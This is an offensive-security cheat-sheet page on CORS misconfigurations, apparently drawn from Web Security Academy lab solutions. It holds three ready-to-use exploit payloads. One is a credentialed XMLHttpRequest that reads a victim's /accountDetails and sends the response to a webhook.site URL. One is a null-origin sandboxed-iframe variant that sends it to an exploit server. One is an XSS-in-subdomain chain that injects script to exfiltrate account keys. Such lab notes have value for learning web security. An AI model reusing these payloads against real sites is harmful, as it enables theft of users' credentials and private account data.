---
title: "Cors"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


##  Basic Cors Misconfiguration :

`Access-Control-Allow-Origin * && Access-Control-Allow-Credentials is True`

```sh
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("https://0a08009804f217fe803f21a500fa0046.web-security-academy.net");
        req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
        req.withCredentials = true;
        req.send(null);

    function retrieveKeys() {
            location='https://webhook.site/383f0fd1-02c0-4dfa-a570-a146e498e388/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```

## Null Origin :

- Sometimes the Null value is accepted so if `Origin: null` is reflected you can do this :

```sh
<iframe sandbox='allow-scripts allow-top-navigation allow-forms' src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a5e006d0328ba97827c602100bb0093.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a6c006c0386baea820e5f1f013e00e3.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```
## XSS + CORs

- Check Allow origin : 

If there is an xss in a subdomain you can exploit the Cors , in this case it only accept this domain `http://0a8600b203276610850ea08900b8000b.web-security-academy.net` and also the subdomain .

```sh
Origin: http://0a8600b203276610850ea08900b8000b.web-security-academy.net
Origin: http://subdomain.0a8600b203276610850ea08900b8000b.web-security-academy.net
```

- It then responds with:

```
HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.0a8600b203276610850ea08900b8000b.web-security-academy.net Access-Control-Allow-Credentials: true 
```

- So you can do this : 
`Don't forget to url the + and < in the script balise to avoid conflic !!`

```sh
<script>
document.location="http://stock.0a8600b203276610850ea08900b8000b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a8600b203276610850ea08900b8000b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a51006f03fe66fd85589fa101060074.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```